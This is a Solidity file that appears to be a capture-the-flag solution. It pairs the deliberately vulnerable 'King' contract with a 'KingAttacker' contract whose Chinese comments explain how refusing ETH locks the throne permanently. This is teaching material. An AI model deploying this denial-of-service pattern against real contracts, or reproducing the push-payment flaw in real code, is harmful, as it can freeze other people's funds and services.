// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

// KingAttacker 成为新的 King以后，其它的合约就不能更换King了；因为 transfer 函数会被revert掉
contract KingAttacker {
    // 没有 receive() 或 fallback() 函数
    // 这样合约就无法接收 ETH
    function attack(address kingAddress) public payable {
        // 需要发送比当前 prize 更多的 ETH
        (bool success,) = kingAddress.call{value: msg.value}("");
        require(success, "Attack failed");
    }
}
